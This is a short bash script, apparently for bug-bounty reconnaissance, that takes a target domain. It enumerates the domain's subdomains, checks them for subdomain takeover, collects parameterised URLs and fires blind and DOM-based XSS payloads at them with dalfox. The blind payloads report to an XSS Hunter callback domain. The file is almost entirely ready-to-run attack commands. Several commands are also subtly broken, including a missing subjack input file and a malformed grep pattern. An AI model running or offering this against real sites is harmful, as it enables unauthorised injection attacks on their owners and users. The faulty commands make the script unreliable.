#! /bin/bash 

#Tools to have installed locally to run these scripts
#subfinder
#assetfinder
#amass 
#Gau(Get all urls)
#subjack
#uro
#dalfox

#Finding Subdomain Takeovers
subfinder -d $1 >> file; assetfinder -subs-only $1; amass enum -norecursive -noalts -d $1; subjack -t 100 -timeout 30 -ssl >> result.txt

#Finding Blind XSS 
#Must have a xss.hunter account and domain
echo "{$1}"| gau -subs| sort -u| grep -v "png\|jpg\|css\|js|\gif\|txt"|grep "="|uro|dalfox pipe --deep-domxss --multicast --blind yourXSSHUNTERDomain.xss.ht
